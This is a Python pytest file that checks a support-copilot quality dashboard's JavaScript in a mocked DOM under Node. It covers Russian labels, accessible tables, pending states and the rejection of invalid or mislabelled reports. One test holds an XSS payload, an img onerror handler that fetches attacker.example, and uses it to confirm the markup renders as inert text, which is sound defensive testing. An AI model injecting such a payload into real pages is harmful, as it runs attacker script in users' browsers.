"""Model-free dashboard behavior in a mocked DOM/fetch; no HTTP or browser."""
import json
import shutil
import subprocess

import pytest

from support_copilot.dashboard import HTML, JS


HARNESS = r'''
const vm=require('node:vm');
let raw='';process.stdin.setEncoding('utf8');process.stdin.on('data',x=>raw+=x);
process.stdin.on('end',async()=>{
 try{
  const fixture=JSON.parse(raw),elements=new Map(),created=[],paths=[];
  class E {
   constructor(tag){this.tag=tag;this.children=[];this.textContent='';this.listeners={};created.push(this);}
   append(...items){this.children.push(...items);}
   replaceChildren(...items){this.children=items;this.textContent='';}
   addEventListener(name,fn){this.listeners[name]=fn;}
   querySelectorAll(){return [];}
   set innerHTML(value){throw new Error('unsafe_html_write');}
  }
  const document={createElement:tag=>new E(tag),getElementById:id=>{
   if(!elements.has(id))elements.set(id,new E('section'));return elements.get(id);
  }};
  const fetch=async path=>{
   paths.push(path);
   if(path==='/v1/quality')return {status:fixture.status,ok:fixture.status===200,json:async()=>fixture.report};
   if(path==='/ready')return {status:200,ok:true,json:async()=>({ready:true})};
   return {status:404,ok:false,json:async()=>({error:{message:'Архив недоступен'}})};
  };
  vm.runInNewContext(fixture.code,{document,fetch,performance:{now:()=>0}},{timeout:2000});
  for(let i=0;i<12;i++)await new Promise(resolve=>setImmediate(resolve));
  const text=e=>e.textContent+e.children.map(text).join(' ');
  process.stdout.write(JSON.stringify({status:elements.get('qualityStatus').textContent,
   text:text(elements.get('qualityMetrics')),tags:created.map(e=>e.tag),
   rowHeaders:created.filter(e=>e.tag==='th'&&e.scope==='row').length,
   formActive:typeof elements.get('form').listeners.submit==='function',paths}));
 }catch(e){process.stderr.write(e.stack);process.exitCode=1;}
});
'''


def report():
    group = {"cases": 100, "category_correct": 17, "category_cases": 42,
             "category_macro_f1": .335, "priority_macro_f1": .593, "p0_recall": 2/6,
             "required_citation_hits": 48, "required_citation_cases": 63,
             "pseudo_citation_cases": 22, "intake_template_cases": 0,
             "fallback_cases": 8, "latency_p50_seconds": 1.61, "latency_p95_seconds": 3.25}
    after = {**group, "category_correct": 23, "pseudo_citation_cases": 0,
             "intake_template_cases": 24, "p0_recall": 1}
    return {"schema_version": 1, "human_gold": False,
            "label_kind": "authored_synthetic_quality_comparison_not_human_gold",
            "comparison": {"before": group, "after": after}, "limitations": []}


def render(data=None, status=200):
    node = shutil.which("node")
    if not node:
        pytest.skip("Node runtime unavailable; no browser substitute claimed")
    result = subprocess.run([node, "-e", HARNESS], input=json.dumps({"code": JS,
        "status": status, "report": data if data is not None else report()}, ensure_ascii=False),
        capture_output=True, encoding="utf8", timeout=10)
    assert result.returncode == 0, result.stderr
    return json.loads(result.stdout)


def test_quality_comparison_has_accessible_headers_and_discloses_templates():
    output = render()
    assert "Проверка завершена" in output["status"]
    assert "17 / 42" in output["text"] and "23 / 42" in output["text"]
    assert "48 / 63" in output["text"] and "Сбор сведений без LLM" in output["text"]
    assert "не доказательство улучшения весов модели" in output["text"]
    assert "table" in output["tags"] and "caption" in output["tags"] and output["rowHeaders"] == 10
    assert output["formActive"]


def test_missing_report_preserves_form_and_has_explicit_pending_state():
    output = render(status=404)
    assert output["status"] == "Новая проверка ещё не завершена"
    assert output["text"] == "" and output["formActive"]
    assert "/v1/quality" in output["paths"] and "/v1/evaluation" in output["paths"]


@pytest.mark.parametrize("bad", ["human_gold", "provenance", "negative_count", "impossible_citations"])
def test_unverified_or_invalid_report_does_not_show_plausible_numbers(bad):
    data = report()
    if bad == "human_gold":
        data["human_gold"] = True
    elif bad == "provenance":
        data["label_kind"] = "human_verified"
    elif bad == "negative_count":
        data["comparison"]["after"]["cases"] = -1
    else:
        data["comparison"]["after"]["required_citation_hits"] = 64
    output = render(data)
    assert "недоступна" in output["status"] and output["text"] == "" and output["formActive"]


def test_limitation_markup_is_literal_text_and_never_an_element():
    data = report()
    attack = '<img src=x onerror="fetch(\'https://attacker.example\')">'
    data["limitations"] = [attack]
    output = render(data)
    assert attack in output["text"] and "img" not in output["tags"]
    assert all(path.startswith("/") for path in output["paths"])


def test_optional_stress_cases_use_their_own_denominators_without_invented_f1():
    data = report()
    data["extra_stress"] = {"cases": 48, "required_citation_hits": 18,
        "required_citation_cases": 24, "pseudo_citation_cases": 0,
        "critical_correct": 12, "critical_cases": 16, "language_matches": 47}
    output = render(data)
    assert "нужные ссылки 18 / 24" in output["text"] and "категория + p0: 12 / 16" in output["text"]
    assert "язык 47 / 48" in output["text"]


def test_priority_recall_and_combined_classification_have_distinct_labels():
    data=report()
    data["extra_stress"]={"cases":16,"required_citation_hits":0,"required_citation_cases":0,
        "pseudo_citation_cases":0,"critical_correct":11,"critical_priority_correct":15,
        "critical_cases":16,"language_matches":16}
    output=render(data)
    assert "категория + p0: 11 / 16" in output["text"]
    assert "приоритет p0: 15 / 16" in output["text"]


def test_absent_optional_stress_report_does_not_hide_completed_comparison():
    data = report()
    data["extra_stress"] = None
    output = render(data)
    assert "Проверка завершена" in output["status"] and "17 / 42" in output["text"]
    assert "Отдельные новые стрессовые сценарии" not in output["text"]


def test_historical_panels_and_safe_render_boundary_remain_explicit():
    assert "Исторический прогон · 36 сценариев" in HTML
    assert "а не ответы текущей версии" in HTML
    assert 'id="qualityStatus" role="status" aria-live="polite"' in HTML
    assert "innerHTML" not in JS and "textContent" in JS
